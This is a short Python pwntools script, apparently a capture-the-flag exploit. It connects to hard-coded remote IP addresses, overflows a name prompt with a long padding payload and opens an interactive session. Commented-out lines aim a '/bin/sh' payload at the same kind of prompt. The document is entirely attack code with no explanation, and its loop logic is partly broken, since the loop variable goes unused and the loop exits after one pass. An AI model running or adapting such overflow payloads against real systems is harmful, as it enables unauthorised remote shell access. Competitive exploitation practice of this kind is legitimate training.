from pwn import *
context(log_level="debug")
flag = []

# p = remote('218.2.197.235',23749)
for x in range(0,0xff):
	try:
		p = remote('106.75.93.221 ',12345)
		p.recvuntil("ts your name?\n")
		p.sendline("a"*0x4f4+chr(32))
		p.recv(1,timeout=3)
		flag.append(x)
		p.interactive()
		p.close()
		
	except:
		p.close()
	break
# p.recvuntil("nput:\n")
# p.sendline("a")
# p.recvuntil("ur name?")
# p.send("a"*0x400+"/bin/sh\0")
# p.interactive()
print flag